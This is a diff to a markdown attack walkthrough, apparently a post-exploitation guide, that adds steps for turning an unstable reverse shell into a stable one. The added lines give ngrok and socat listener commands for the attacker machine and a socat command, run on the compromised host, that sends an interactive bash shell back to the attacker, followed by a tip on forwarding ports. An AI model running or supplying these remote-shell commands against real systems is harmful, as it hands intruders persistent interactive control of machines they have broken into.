@@ -51,6 +51,20 @@ After setting up a listener, run the `dropin.sh` from the location above with th
 ./dropin.sh
 ```
 This will get you the reverse shell as.
+
+Now this shell is not stable, so to get a stable reverse shell to perform next steps use the following command on the attacker machine.
+```bash
+ngrok tcp 4242
+socat file:`tty`,raw,echo=0 TCP-L:4242
+```
+
+and run the following command on the unstable reverse shell.
+
+```bash
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:4242
+```
+
+Make sure to change the IP address and the port number on these two commands, and also one thing to note here is that ngrok does not provide the functionality to forward two ports at one time, so to overcome this you may have a paid version or use two different machines on the same network like a virtual machine with different ngrok account.
 #### 7. Enumeration
 
 Perform enumeration to gather information about the system:
